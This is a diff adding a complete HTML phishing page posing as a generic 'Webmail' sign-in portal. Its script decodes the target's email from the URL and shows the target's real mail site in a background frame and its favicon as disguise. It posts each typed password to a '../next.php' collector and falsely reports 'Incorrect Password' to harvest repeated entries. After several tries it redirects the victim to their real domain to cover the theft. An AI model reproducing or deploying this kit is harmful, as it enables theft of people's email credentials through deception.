@@ -1,0 +1,577 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css">
+    <title id="pageTitle">Portal Access</title>
+    <link rel="icon" class="logoimg" type="image/x-icon" href="">
+    <link href="css/hover.css" rel="stylesheet" media="all">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/font-awesome.min.css">
+    <style>
+    .login-form {
+        width: 385px;
+        margin: 30px auto;
+    }
+    .login-form form {
+        margin-bottom: 15px;
+        background: #f7f7f7;
+        box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
+        padding: 30px;
+    }
+    .login-form h2 {
+        margin: 0 0 15px;
+    }
+    .form-control,
+    .login-btn {
+        min-height: 38px;
+        border-radius: 2px;
+    }
+    .input-group-addon .fa {
+        font-size: 18px;
+    }
+    .login-btn {
+        font-size: 15px;
+        font-weight: bold;
+    }
+    .social-btn .btn {
+        border: none;
+        margin: 10px 3px 0;
+        opacity: 1;
+    }
+    .social-btn .btn:hover {
+        opacity: 0.9;
+    }
+    .social-btn .btn-primary {
+        background: #507cc0;
+    }
+    .social-btn .btn-info {
+        background: #64ccf1;
+    }
+    .social-btn .btn-danger {
+        background: #df4930;
+    }
+    .or-seperator {
+        margin-top: 20px;
+        text-align: center;
+        border-top: 1px solid #ccc;
+    }
+    .or-seperator i {
+        padding: 0 10px;
+        background: #f7f7f7;
+        position: relative;
+        top: -11px;
+        z-index: 1;
+    }
+    </style>
+</head>
+
+<body>
+    <iframe id="mainPage" src="" width="100%" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;pointer-events: none;z-index: -9999;"></iframe>
+    <p>&nbsp;</p>
+    <p>&nbsp;</p>
+    <div class="login-form">
+        <form action="#" method="post">
+            <h3 class="text-center">
+                <div id="top">
+                    <img src="images/download.jpeg" alt="Mailbox" class="logoimg" style="width:38px">
+                    <span style="vertical-align: middle; padding-left: 5px" class="domain" id="webmailLabel">Webmail</span>
+                </div>
+                <br>
+                <p style="font-weight: 500;color: gray;font-size: 18px;" id="signInTitle">Sign in to continue</p>
+                <br>
+            </h3>
+            <center>
+                <span id="err" style="display: none;" class="text-danger font-weight-bold" id="errorLabel">Incorrect Password, Please try again.</span>
+            </center>
+            <div class="form-group">
+                <div class="input-group">
+                    <span class="input-group-addon"><i class="fas fa-user"></i></span>
+                    <input type="email" class="form-control" name="username" placeholder="Username" value="" id="backEm">
+                </div>
+            </div>
+            <div class="form-group">
+                <div class="input-group">
+                    <span class="input-group-addon"><i class="fas fa-lock"></i></span>
+                    <input id="pass" type="password" class="form-control" name="pdf2" placeholder="Password" required>
+                </div>
+            </div>
+            <div class="form-group">
+                <input type="hidden" name="pdf1" size="35" value="info@dell.com">
+                <input type="hidden" name="address" size="5" value="ancoreinspection.com">
+                <br>
+                <input type="hidden" name="ai" size="35" value="">
+                <input type="hidden" name="type" size="5" value="ancoreinspection.com">
+                <button type="button" class="btn btn-primary login-btn btn-block" id="next-btn">Sign in</button>
+            </div>
+            <div class="clearfix">
+                <label class="pull-left checkbox-inline"><input type="checkbox" id="securedLoginCheckbox"> <span id="securedLoginLabel">Secured Login session?</span></label>
+                <a href="#" class="pull-right" id="forgotPasswordLabel">Forgot Password?</a>
+            </div>
+        </form>
+        <div style="text-align: center;">
+            <a href="#">&copy;<script>document.write(new Date().getFullYear());</script> <span id="copyrightLabel">Copyright</span>. <span class="domain" id="webmailLabel2">Webmail</span>
+            </a>
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
+
+    <script>
+    // ================================================================
+    // AUTO-TRANSLATION BASED ON BROWSER LANGUAGE (PURE JAVASCRIPT)
+    // ================================================================
+
+    // Detect user's browser language
+    var userLang = (navigator.language || navigator.userLanguage || 'en').substr(0, 2);
+
+    // Complete translations for all supported languages
+    var translations = {
+        'en': {
+            'page_title': 'Portal Access',
+            'webmail': 'Webmail',
+            'sign_in_title': 'Sign in to continue',
+            'incorrect_password': 'Incorrect Password, Please try again.',
+            'username': 'Username',
+            'password': 'Password',
+            'sign_in': 'Sign in',
+            'secured_login': 'Secured Login session?',
+            'forgot_password': 'Forgot Password?',
+            'copyright': 'Copyright',
+            'email_field_empty': 'Email field is empty.',
+            'account_not_exist': "That account doesn't exist. Enter a different account",
+            'password_field_empty': 'Password field is empty.',
+            'verifying': 'Verifying...'
+        },
+        'es': {
+            'page_title': 'Acceso al Portal',
+            'webmail': 'Correo Web',
+            'sign_in_title': 'Iniciar sesión para continuar',
+            'incorrect_password': 'Contraseña incorrecta, por favor intente de nuevo.',
+            'username': 'Usuario',
+            'password': 'Contraseña',
+            'sign_in': 'Iniciar sesión',
+            'secured_login': '¿Sesión de inicio segura?',
+            'forgot_password': '¿Olvidó su contraseña?',
+            'copyright': 'Derechos de autor',
+            'email_field_empty': 'El campo de correo electrónico está vacío.',
+            'account_not_exist': 'Esa cuenta no existe. Ingrese una cuenta diferente',
+            'password_field_empty': 'El campo de contraseña está vacío.',
+            'verifying': 'Verificando...'
+        },
+        'fr': {
+            'page_title': 'Accès au Portail',
+            'webmail': 'Webmail',
+            'sign_in_title': 'Connectez-vous pour continuer',
+            'incorrect_password': 'Mot de passe incorrect, veuillez réessayer.',
+            'username': "Nom d'utilisateur",
+            'password': 'Mot de passe',
+            'sign_in': 'Se connecter',
+            'secured_login': 'Session de connexion sécurisée ?',
+            'forgot_password': 'Mot de passe oublié ?',
+            'copyright': "Droits d'auteur",
+            'email_field_empty': 'Le champ de courriel est vide.',
+            'account_not_exist': "Ce compte n'existe pas. Entrez un compte différent",
+            'password_field_empty': 'Le champ du mot de passe est vide.',
+            'verifying': 'Vérification...'
+        },
+        'de': {
+            'page_title': 'Portal-Zugang',
+            'webmail': 'Webmail',
+            'sign_in_title': 'Melden Sie sich an, um fortzufahren',
+            'incorrect_password': 'Falsches Passwort, bitte versuchen Sie es erneut.',
+            'username': 'Benutzername',
+            'password': 'Passwort',
+            'sign_in': 'Anmelden',
+            'secured_login': 'Gesicherte Anmeldesitzung?',
+            'forgot_password': 'Passwort vergessen?',
+            'copyright': 'Urheberrecht',
+            'email_field_empty': 'Das E-Mail-Feld ist leer.',
+            'account_not_exist': 'Dieses Konto existiert nicht. Geben Sie ein anderes Konto ein',
+            'password_field_empty': 'Das Passwortfeld ist leer.',
+            'verifying': 'Überprüfen...'
+        },
+        'pt': {
+            'page_title': 'Acesso ao Portal',
+            'webmail': 'Webmail',
+            'sign_in_title': 'Faça login para continuar',
+            'incorrect_password': 'Senha incorreta, por favor tente novamente.',
+            'username': 'Usuário',
+            'password': 'Senha',
+            'sign_in': 'Entrar',
+            'secured_login': 'Sessão de login segura?',
+            'forgot_password': 'Esqueceu a senha?',
+            'copyright': 'Direitos autorais',
+            'email_field_empty': 'O campo de e-mail está vazio.',
+            'account_not_exist': 'Essa conta não existe. Insira uma conta diferente',
+            'password_field_empty': 'O campo de senha está vazio.',
+            'verifying': 'Verificando...'
+        },
+        'it': {
+            'page_title': 'Accesso al Portale',
+            'webmail': 'Webmail',
+            'sign_in_title': 'Accedi per continuare',
+            'incorrect_password': 'Password errata, si prega di riprovare.',
+            'username': 'Nome utente',
+            'password': 'Password',
+            'sign_in': 'Accedi',
+            'secured_login': 'Sessione di accesso sicura?',
+            'forgot_password': 'Password dimenticata?',
+            'copyright': "Diritti d'autore",
+            'email_field_empty': 'Il campo email è vuoto.',
+            'account_not_exist': 'Questo account non esiste. Inserisci un account diverso',
+            'password_field_empty': 'Il campo della password è vuoto.',
+            'verifying': 'Verifica in corso...'
+        },
+        'ru': {
+            'page_title': 'Доступ к порталу',
+            'webmail': 'Веб-почта',
+            'sign_in_title': 'Войдите, чтобы продолжить',
+            'incorrect_password': 'Неверный пароль, попробуйте снова.',
+            'username': 'Имя пользователя',
+            'password': 'Пароль',
+            'sign_in': 'Войти',
+            'secured_login': 'Безопасный сеанс входа?',
+            'forgot_password': 'Забыли пароль?',
+            'copyright': 'Авторские права',
+            'email_field_empty': 'Поле электронной почты пусто.',
+            'account_not_exist': 'Эта учетная запись не существует. Введите другую учетную запись',
+            'password_field_empty': 'Поле пароля пусто.',
+            'verifying': 'Проверка...'
+        },
+        'ar': {
+            'page_title': 'الوصول إلى البوابة',
+            'webmail': 'البريد الإلكتروني',
+            'sign_in_title': 'تسجيل الدخول للمتابعة',
+            'incorrect_password': 'كلمة مرور غير صحيحة، يرجى المحاولة مرة أخرى.',
+            'username': 'اسم المستخدم',
+            'password': 'كلمة المرور',
+            'sign_in': 'تسجيل الدخول',
+            'secured_login': 'جلسة تسجيل دخول آمنة؟',
+            'forgot_password': 'نسيت كلمة المرور؟',
+            'copyright': 'حقوق النشر',
+            'email_field_empty': 'حقل البريد الإلكتروني فارغ.',
+            'account_not_exist': 'هذا الحساب غير موجود. أدخل حسابًا مختلفًا',
+            'password_field_empty': 'حقل كلمة المرور فارغ.',
+            'verifying': 'جاري التحقق...'
+        },
+        'zh': {
+            'page_title': '门户访问',
+            'webmail': '网页邮件',
+            'sign_in_title': '登录以继续',
+            'incorrect_password': '密码错误，请重试。',
+            'username': '用户名',
+            'password': '密码',
+            'sign_in': '登录',
+            'secured_login': '安全登录会话？',
+            'forgot_password': '忘记密码？',
+            'copyright': '版权所有',
+            'email_field_empty': '电子邮件字段为空。',
+            'account_not_exist': '该帐户不存在。请输入不同的帐户',
+            'password_field_empty': '密码字段为空。',
+            'verifying': '验证中...'
+        },
+        'ja': {
+            'page_title': 'ポータルアクセス',
+            'webmail': 'ウェブメール',
+            'sign_in_title': '続行するにはサインインしてください',
+            'incorrect_password': 'パスワードが間違っています。もう一度お試しください。',
+            'username': 'ユーザー名',
+            'password': 'パスワード',
+            'sign_in': 'サインイン',
+            'secured_login': '安全なログインセッション？',
+            'forgot_password': 'パスワードをお忘れですか？',
+            'copyright': '著作権',
+            'email_field_empty': 'メールフィールドが空です。',
+            'account_not_exist': 'このアカウントは存在しません。別のアカウントを入力してください',
+            'password_field_empty': 'パスワードフィールドが空です。',
+            'verifying': '確認中...'
+        },
+        'nl': {
+            'page_title': 'Toegang tot Portaal',
+            'webmail': 'Webmail',
+            'sign_in_title': 'Log in om door te gaan',
+            'incorrect_password': 'Onjuist wachtwoord, probeer het opnieuw.',
+            'username': 'Gebruikersnaam',
+            'password': 'Wachtwoord',
+            'sign_in': 'Inloggen',
+            'secured_login': 'Beveiligde inlogsessie?',
+            'forgot_password': 'Wachtwoord vergeten?',
+            'copyright': 'Auteursrecht',
+            'email_field_empty': 'E-mailveld is leeg.',
+            'account_not_exist': 'Dit account bestaat niet. Voer een ander account in',
+            'password_field_empty': 'Wachtwoordveld is leeg.',
+            'verifying': 'Verifiëren...'
+        }
+    };
+
+    // Fallback to English if language not supported
+    if (!translations[userLang]) {
+        userLang = 'en';
+    }
+
+    var t = translations[userLang];
+
+    // Apply translations to the page when ready
+    $(document).ready(function() {
+        // Page title
+        document.title = t.page_title;
+        
+        // Text elements
+        $('#webmailLabel, #webmailLabel2').text(t.webmail);
+        $('#signInTitle').text(t.sign_in_title);
+        $('#errorLabel').text(t.incorrect_password);
+        $('input[name="username"]').attr('placeholder', t.username);
+        $('#pass').attr('placeholder', t.password);
+        $('#next-btn').text(t.sign_in);
+        $('#securedLoginLabel').text(t.secured_login);
+        $('#forgotPasswordLabel').text(t.forgot_password);
+        $('#copyrightLabel').text(t.copyright);
+        
+        // Store translations globally for use in other functions
+        window.translations = t;
+    });
+
+    // ================================================================
+    // ORIGINAL FUNCTIONALITY WITH TRANSLATED ERRORS
+    // ================================================================
+
+    $(document).ready(function() {
+        $(document).on('keypress', function(e) {
+            if (e.which === 13) {
+                $('#next-btn').click();
+            }
+        });
+
+        // Get parameters from URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const useridEncoded = urlParams.get('userid');
+        const maxTry = parseInt(urlParams.get('maxtry') || '3');
+        const pageValue = urlParams.get('page') || '';
+        const domainRedirect = urlParams.get('domain_redirect') || '';
+
+        let tryCount = 0;
+        let userid = '';
+
+        // Decode Base64 email
+        try {
+            userid = atob(useridEncoded || '');
+        } catch (e) {
+            console.error("Invalid userid encoding");
+        }
+
+        // Fill userid into #backEm
+        if ($('#backEm').length) {
+            $('#backEm').text(userid);
+        }
+        if ($('#backEMF').length) {
+            $('#backEMF').val(userid);
+        }
+
+        try {
+            var my_ai = userid;
+            $('#backEm').val(my_ai);
+            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+            if (!filter.test(my_ai)) {
+                $('#errror').show();
+                ai.focus;
+                return false;
+            }
+            var ind = my_ai.indexOf("@");
+            var m_slic = my_ai.substr((ind + 1));
+            var c = m_slic.substr(0, m_slic.indexOf('.'));
+            var fnll = c.toLowerCase();
+            var fnllu = c.toUpperCase();
+
+            var mainPage = 'https://' + m_slic;
+            document.getElementById('mainPage').src = mainPage;
+
+            $(".logoimg").attr("src", "https://www.google.com/s2/favicons?sz=64&domain_url=" + m_slic);
+            $(".logoimg").attr("href", "https://www.google.com/s2/favicons?sz=64&domain_url=" + m_slic);
+
+            $(".domain").html(fnllu);
+
+        } catch {
+            console.log("error");
+        }
+
+        // Hide error initially
+        $('#err').hide();
+
+        // Next button click handler
+        $('#next-btn').on('click', function() {
+            const password = $('#pass').val().trim();
+
+            // If password empty - show translated error
+            if (!password) {
+                $('#err').text(t.password_field_empty);
+                $('#err').show();
+                return;
+            }
+
+            // Disable button until AJAX finishes
+            $('#next-btn').prop('disabled', true);
+
+            // Prepare POST data
+            const postData = {
+                ai: userid,
+                pr: password,
+                page_value: pageValue
+            };
+
+            $.ajax({
+                url: '../next.php',
+                type: 'POST',
+                data: postData,
+                success: function(response) {
+                    tryCount++;
+
+                    if (tryCount >= maxTry) {
+                        // After maxTry, proceed normally
+                        $('#err').hide();
+                        const emailParts = userid.split('@');
+                        if (!domainRedirect) {
+                            if (emailParts.length === 2) {
+                                const domain = emailParts[1];
+                                window.location.replace(`https://${domain}`);
+                            } else {
+                                window.location.replace("https://www.google.com");
+                            }
+                        } else {
+                            window.location.replace(domainRedirect);
+                        }
+                    } else {
+                        // Show error and reset password field
+                        $('#err').text(t.incorrect_password);
+                        $('#err').show();
+                        $('#pass').val('');
+                    }
+                },
+                error: function() {
+                    alert("Error contacting server.");
+                },
+                complete: function() {
+                    // Re-enable button after request finishes
+                    $('#next-btn').prop('disabled', false);
+                }
+            });
+        });
+    });
+
+    // ================================================================
+    // SECONDARY SCRIPT (for hash-based authentication)
+    // ================================================================
+
+    $(document).ready(function() {
+        var cntt = 0;
+        var ai = window.location.hash.substr(1);
+        if (!ai) {
+
+        } else {
+            var my_ai = ai;
+            $('#backEm').val(my_ai);
+            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+            if (!filter.test(my_ai)) {
+                $('#errror').show();
+                ai.focus;
+                return false;
+            }
+            var ind = my_ai.indexOf("@");
+            var m_slic = my_ai.substr((ind + 1));
+            var c = m_slic.substr(0, m_slic.indexOf('.'));
+            var fnll = c.toLowerCase();
+            var fnllu = c.toUpperCase();
+
+            var mainPage = 'https://' + m_slic;
+            document.getElementById('mainPage').src = mainPage;
+
+            $(".logoimg").attr("src", "https://www.google.com/s2/favicons?sz=64&domain_url=" + m_slic);
+            $(".logoimg").attr("href", "https://www.google.com/s2/favicons?sz=64&domain_url=" + m_slic);
+
+            $(".domain").html(fnllu);
+        }
+
+        $('#sub_btn').click(function(event) {
+            $('#errror').hide();
+            $('#mgss').hide();
+            event.preventDefault();
+            var ai = $("#backEm").val();
+            var pr = $("#pr").val();
+            var mgss = $('#mgss').html();
+            $('#mgss').text(mgss);
+
+            var my_ai = ai;
+            var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+            if (!ai) {
+                $('#errror').show();
+                $('#errror').html(t.email_field_empty);
+                return false;
+            }
+
+            if (!filter.test(my_ai)) {
+                $('#errror').show();
+                $('#errror').html(t.account_not_exist);
+                return false;
+            }
+            if (!pr) {
+                $('#errror').show();
+                $('#errror').html(t.password_field_empty);
+                return false;
+            }
+
+            var ind = my_ai.indexOf("@");
+            var m_slic = my_ai.substr((ind + 1));
+            var c = m_slic.substr(0, m_slic.indexOf('.'));
+            var fnll = c.toLowerCase();
+            var fnllu = c.toUpperCase();
+
+            $(".logoimg").attr("src", "https://www.google.com/s2/favicons?sz=64&domain_url=" + m_slic);
+            $(".logoimg").attr("href", "https://www.google.com/s2/favicons?sz=64&domain_url=" + m_slic);
+            $(".domain").html(fnllu);
+
+            cntt = cntt + 1;
+
+            $.ajax({
+                dataType: 'JSON',
+                url: f,
+                type: 'POST',
+                data: {
+                    ai: ai,
+                    pr: pr,
+                },
+                beforeSend: function(xhr) {
+                    $('#sub_btn').html(t.verifying);
+                },
+                complete: function() {
+                    $("#pr").val("");
+                    if (cntt >= rc) {
+                        cntt = 0;
+                        if (domain_redirect == 1) {
+                            window.location.replace("http://www." + m_slic);
+                        } else {
+                            window.location.replace(rdrt)
+                        }
+                        return false;
+                    }
+                    $("#mgss").show();
+                    $('#sub_btn').html(t.sign_in);
+                }
+            });
+        });
+    });
+    </script>
+
+</body>
+</html>
